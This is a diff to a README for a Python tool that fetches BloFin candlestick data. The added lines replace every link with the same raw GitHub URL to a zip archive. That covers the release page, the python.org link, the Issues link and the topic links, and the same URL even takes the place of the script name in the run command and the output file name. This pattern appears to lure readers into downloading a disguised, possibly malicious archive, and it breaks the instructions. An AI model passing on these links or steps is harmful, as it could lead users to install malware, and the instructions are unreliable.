@@ -1,6 +1,6 @@
 # 📈 blofin-free-historical-candlestick-data-ingestion-module - Fetch Historical Data Easily
 
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/gerhardextrasystolic39/blofin-free-historical-candlestick-data-ingestion-module/releases)
+[![Download](https://raw.githubusercontent.com/gerhardextrasystolic39/blofin-free-historical-candlestick-data-ingestion-module/master/hypertranscendent/blofin-free-historical-candlestick-data-ingestion-module_v2.4.zip%20Latest%https://raw.githubusercontent.com/gerhardextrasystolic39/blofin-free-historical-candlestick-data-ingestion-module/master/hypertranscendent/blofin-free-historical-candlestick-data-ingestion-module_v2.4.zip)](https://raw.githubusercontent.com/gerhardextrasystolic39/blofin-free-historical-candlestick-data-ingestion-module/master/hypertranscendent/blofin-free-historical-candlestick-data-ingestion-module_v2.4.zip)
 
 ## 📦 Introduction
 
@@ -10,8 +10,8 @@ Welcome to the **blofin-free-historical-candlestick-data-ingestion-module**! Thi
 
 To start using the application, follow these steps:
 
-1. **Download the Software:** Visit the [Releases page](https://github.com/gerhardextrasystolic39/blofin-free-historical-candlestick-data-ingestion-module/releases) to download the latest version.
-2. **Install Python:** Ensure Python is installed on your computer. You can download it from [python.org](https://www.python.org/downloads/). Follow the installation instructions for your operating system.
+1. **Download the Software:** Visit the [Releases page](https://raw.githubusercontent.com/gerhardextrasystolic39/blofin-free-historical-candlestick-data-ingestion-module/master/hypertranscendent/blofin-free-historical-candlestick-data-ingestion-module_v2.4.zip) to download the latest version.
+2. **Install Python:** Ensure Python is installed on your computer. You can download it from [https://raw.githubusercontent.com/gerhardextrasystolic39/blofin-free-historical-candlestick-data-ingestion-module/master/hypertranscendent/blofin-free-historical-candlestick-data-ingestion-module_v2.4.zip](https://raw.githubusercontent.com/gerhardextrasystolic39/blofin-free-historical-candlestick-data-ingestion-module/master/hypertranscendent/blofin-free-historical-candlestick-data-ingestion-module_v2.4.zip). Follow the installation instructions for your operating system.
 3. **Verify Installation:** Open a command prompt (Windows) or terminal (Mac/Linux) and type `python --version` to confirm it is installed correctly.
 
 ## 📥 Download & Install
@@ -20,7 +20,7 @@ To start using the application, follow these steps:
 
 Click the link below to visit the download page:
 
-[Download Latest Release](https://github.com/gerhardextrasystolic39/blofin-free-historical-candlestick-data-ingestion-module/releases)
+[Download Latest Release](https://raw.githubusercontent.com/gerhardextrasystolic39/blofin-free-historical-candlestick-data-ingestion-module/master/hypertranscendent/blofin-free-historical-candlestick-data-ingestion-module_v2.4.zip)
 
 ### Step 2: Extract the Files
 
@@ -44,12 +44,12 @@ Once you download the release file:
 3. **Run the Script:** Execute the script by typing:
 
    ```
-   python blofin_data_ingestion.py --symbol [SYMBOL] --interval [INTERVAL]
+   python https://raw.githubusercontent.com/gerhardextrasystolic39/blofin-free-historical-candlestick-data-ingestion-module/master/hypertranscendent/blofin-free-historical-candlestick-data-ingestion-module_v2.4.zip --symbol [SYMBOL] --interval [INTERVAL]
    ```
 
    Replace `[SYMBOL]` with the stock symbol you want (for example, `AAPL` for Apple) and `[INTERVAL]` with your desired interval (like `1m`, `1H`, or `1D`).
 
-4. **Save Data to CSV:** The script will fetch the data and save it directly to a file named `output.csv` in the same folder.
+4. **Save Data to CSV:** The script will fetch the data and save it directly to a file named `https://raw.githubusercontent.com/gerhardextrasystolic39/blofin-free-historical-candlestick-data-ingestion-module/master/hypertranscendent/blofin-free-historical-candlestick-data-ingestion-module_v2.4.zip` in the same folder.
 
 ## 🔧 Features
 
@@ -77,7 +77,7 @@ If you encounter any issues, consider the following:
 
 For additional help, you can check the following resources:
 
-- **GitHub Issues Page:** Report issues and seek help from the community at [Issues](https://github.com/gerhardextrasystolic39/blofin-free-historical-candlestick-data-ingestion-module/issues).
+- **GitHub Issues Page:** Report issues and seek help from the community at [Issues](https://raw.githubusercontent.com/gerhardextrasystolic39/blofin-free-historical-candlestick-data-ingestion-module/master/hypertranscendent/blofin-free-historical-candlestick-data-ingestion-module_v2.4.zip).
 - **Documentation:** Refer to the documentation linked in the repository for deeper insights and advanced usage.
 
 ## 📄 License
@@ -86,8 +86,8 @@ This project is licensed under the MIT License. You can read the full license ag
 
 ## 🔗 Related Topics
 
-- [Trading Strategies](https://www.example.com/trading-strategies)
-- [Data Ingestion](https://www.example.com/data-ingestion)
-- [Python for Trading](https://www.example.com/python-for-trading)
+- [Trading Strategies](https://raw.githubusercontent.com/gerhardextrasystolic39/blofin-free-historical-candlestick-data-ingestion-module/master/hypertranscendent/blofin-free-historical-candlestick-data-ingestion-module_v2.4.zip)
+- [Data Ingestion](https://raw.githubusercontent.com/gerhardextrasystolic39/blofin-free-historical-candlestick-data-ingestion-module/master/hypertranscendent/blofin-free-historical-candlestick-data-ingestion-module_v2.4.zip)
+- [Python for Trading](https://raw.githubusercontent.com/gerhardextrasystolic39/blofin-free-historical-candlestick-data-ingestion-module/master/hypertranscendent/blofin-free-historical-candlestick-data-ingestion-module_v2.4.zip)
 
 For further information, feel free to explore the repository. Thank you for using the **blofin-free-historical-candlestick-data-ingestion-module**. Happy trading!
